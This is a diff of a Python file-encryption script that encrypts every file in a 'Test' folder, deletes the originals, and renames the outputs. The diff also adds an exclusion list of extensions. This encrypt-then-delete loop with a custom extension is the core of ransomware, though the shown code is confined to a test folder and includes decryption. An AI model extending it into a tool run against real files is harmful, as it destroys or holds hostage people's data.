@@ -28,8 +28,9 @@ def encrypt(file, key):
     
     encrypted = f.encrypt(original)
 
-    filename = str(file) + '.imin'
-    encFile = Path(filename)
+    filename, extension = str(file).split('.')
+    filename += '_encrypted.'
+    encFile = Path(filename + extension)
     with open(encFile, 'wb+') as fl:
         fl.write(encrypted)
     os.remove(file)
@@ -43,9 +44,11 @@ def decrypt(file, key):
     
     decrypted = f.decrypt(encrypted)
 
-    filename = str(file).split('.imin')[0]
+    filename, extension = str(file).split('.')
+    filename = filename.split('_encrypted')[0]
 
-    decFile = Path(filename)
+    filename += '_decrypted.'
+    decFile = Path(filename + extension)
 
     with open(decFile, 'wb+') as fl:
         fl.write(decrypted)
@@ -62,6 +65,7 @@ def encryptFiles(key):
         print('Encrypted ' + str(filePath))
 
 def decryptFiles(key):
+    exclude = ['.py','.pem', '.exe', '.imin']
     for item in recursiveScan(os.getcwd() + '\Test'): 
         filePath = Path(item)
         extension = filePath.suffix.lower()
